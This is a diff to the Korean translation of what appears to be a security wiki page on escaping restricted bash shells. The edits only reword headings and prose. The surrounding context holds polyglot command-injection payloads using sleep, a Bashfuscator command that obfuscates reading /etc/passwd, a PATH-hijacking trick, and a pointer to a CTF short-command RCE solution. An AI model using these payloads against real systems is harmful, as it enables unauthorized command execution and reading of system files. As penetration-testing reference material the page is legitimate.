@@ -145,7 +145,7 @@ echo ${PATH:0:1} #/
 
 ### 내장 명령어
 
-외부 함수를 실행할 수 없고 **RCE를 얻기 위해 제한된 내장 명령어 집합에만 접근할 수 있는 경우**, 이를 수행하기 위한 몇 가지 유용한 요령이 있습니다. 일반적으로 **모든** **내장 명령어**를 사용할 수 없으므로, 감옥을 우회하기 위해 **모든 옵션을 알아야** 합니다. 아이디어는 [**devploit**](https://twitter.com/devploit)에서 가져왔습니다.\
+외부 함수를 실행할 수 없고 **RCE를 얻기 위해 제한된 내장 명령어 집합에만 접근할 수 있는 경우**, 이를 수행하기 위한 몇 가지 유용한 요령이 있습니다. 일반적으로 **모든** **내장 명령어를 사용할 수는 없으므로**, 감옥을 우회하기 위해 **모든 옵션을 알아야** 합니다. [**devploit**](https://twitter.com/devploit)에서 아이디어를 얻었습니다.\
 먼저 모든 [**셸 내장 명령어**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**를 확인하세요.** 그런 다음 여기에 몇 가지 **추천 사항**이 있습니다:
 ```bash
 # Get list of builtins
@@ -198,7 +198,7 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### 다중 언어 명령 주입
+### 다국어 명령 주입
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -213,7 +213,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5자 RCE
+### 5글자로 RCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -297,7 +297,7 @@ ln /f*
 ```
 ## 읽기 전용/Noexec/Distroless 우회
 
-**읽기 전용 및 noexec 보호**가 있는 파일 시스템이나 심지어 distroless 컨테이너 안에 있다면, 여전히 **임의의 바이너리, 심지어 셸을 실행할 수 있는 방법이 있습니다!:**
+**읽기 전용 및 noexec 보호**가 있는 파일 시스템이나 심지어 distroless 컨테이너 안에 있다면, 여전히 **임의의 바이너리, 심지어 쉘을 실행할 수 있는 방법이 있습니다!:**
 
 {{#ref}}
 ../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
